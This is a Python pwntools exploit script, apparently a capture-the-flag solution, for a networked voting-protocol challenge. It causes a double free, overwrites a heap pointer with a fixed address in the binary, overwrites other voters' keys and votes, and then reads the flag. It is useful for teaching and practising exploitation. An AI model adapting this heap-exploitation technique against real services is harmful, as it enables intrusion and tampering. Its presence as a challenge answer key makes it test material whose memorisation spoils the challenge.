#!/usr/bin/env python3

from asyncio.tasks import wait
import time
import sys
import os
from pwn import p32, p64, u32, u64, context, remote
from time import sleep
from construct import *
from ctypes import sizeof, c_int
import struct
import codecs
from hashlib import sha256
from binascii import hexlify

MESSAGE_HEADER_LEN = sizeof(c_int) + 32 + sizeof(c_int)
VOTER_BASE = p64(0x405160)  # Pulled from binary. Start of the voters structure array.

POSE_QUESTION     = 0
VOTER_VOTE        = 1
MSG_RESPONSE      = 2
VOTER_LOG_CACHE   = 3
VOTER_LOG_SAVE    = 4
VOTER_READY       = 5
INVALID_DIRECTIVE = 99

GenericMessageHeader = Struct(
    'directive' / Int32ul,
    'key'       / Bytes(32),
    'mlen'      / Int32ul
)

def pwfl(out):
    if type(out) == bytes:
        out = out.decode()
    sys.stdout.write(out+'\n')
    sys.stdout.flush()

def create_msg(msg, d, key):
    msg_size = len(msg)  # directive, key, length of header+msg, msg
    full_msg_packed = struct.pack(f"<I32sI", d, key, msg_size) + msg

    pwfl(f"Creating message with len {len(full_msg_packed)}: {hexlify(full_msg_packed)}")

    return full_msg_packed

def exploitChallenge(p, key):

    voted         = False # The initial vote
    freed         = False # Freeing our initial vote to help cause df
    overwrite_ptr = False # Overwrite pointer in chunk
    log_cached    = False # Cache log to prep our old chunk
    overwrite_key = False # Overwrite key using old chunk
    question      = False # Are we ready for a new question yet?
    waitfornewkey = False # Have we answered a question and are waiting for a response with our new key?
    commit_vote   = False # Did we commit a vote last round?

    while(True):
        msg = p.recvline().strip()

        if b"flag" in msg:
            pwfl(msg)
            break

        if b"Okay where the heck are we going? Guys?" in msg:
            continue

        pwfl(f"Msg Received: {msg}\n")

        msg = codecs.decode(msg, "hex")
        try:
            msgHeader = GenericMessageHeader.parse(msg[0:MESSAGE_HEADER_LEN])
        except StreamError as e:
            continue

        if msgHeader.directive == 0:
            question = True

        if msgHeader.directive == 1 and msgHeader.key == b"\xFF"*32:
            commit_vote = True

        if msgHeader.key == key:
            key = sha256(key).digest()
            pwfl(f"Key is now: {key}")
            waitfornewkey = False
        elif waitfornewkey:
            pwfl("Waiting for new key...\n")
            continue

        if(not voted and question):
            pwfl("First vote")
            voter_msg = create_msg(b"1"*8*4, VOTER_VOTE, key)
            p.sendline(hexlify(voter_msg))
            voted = True
            question = False
            waitfornewkey = True
            continue
        elif(not voted):
            continue

        if(voted and not freed):
            pwfl("Causing doublefree")
            # Causes doublefree
            voter_msg = create_msg(b"", VOTER_READY, key)
            p.sendline(hexlify(voter_msg))
            freed = True
            continue

        if(voted and freed and not overwrite_ptr and question):
            pwfl("Overwriting pointer in chunk")
            voter_msg = create_msg(VOTER_BASE, VOTER_VOTE, key)
            p.sendline(hexlify(voter_msg))
            
            overwrite_ptr = True
            waitfornewkey = True
            continue
            
        if(voted and freed and overwrite_ptr and not log_cached):
            pwfl("Caching a log...")
            voter_msg = create_msg(b"A"*8*4, VOTER_LOG_CACHE, key)
            p.sendline(hexlify(voter_msg))

            log_cached = True
            continue
    
        if(voted and freed and overwrite_ptr and log_cached and not overwrite_key):
            pwfl("Overwriting keys...")
            voter_msg = create_msg(b"A"*8*4, VOTER_LOG_CACHE, key)
            p.sendline(hexlify(voter_msg))

            overwrite_key = True
        
        if(overwrite_key and commit_vote and question):
            pwfl("Voting normally...")
            time.sleep(1.5) # Wait until other all other voters commit so we can overwrite their commit
            voter_msg = create_msg(b"\00"*8*4, VOTER_VOTE, key)
            question = False
            waitfornewkey = True
            commit_vote = False
            p.sendline(hexlify(voter_msg))

    return

if __name__ == "__main__":
    if len(sys.argv) > 1:
        p = open(sys.argv[1], 'wb')
    else: 
        p = remote(os.getenv("CHAL_HOST", "172.17.0.1"), os.getenv("CHAL_PORT", "31337"))
        # get ticket from environment
        ticket = os.getenv("TICKET")

        # pass ticket to ticket-taker
        if ticket:
            prompt = p.recv(128)  # "Ticket please:"
            p.send((ticket + "\n").encode("utf-8"))
            pwfl("Sent Ticket")
        
    banner = p.recvline()
    key = p.recvline()

    key = key.strip().split(b" ")[-1]

    pwfl(key)
    exploitChallenge(p, key)
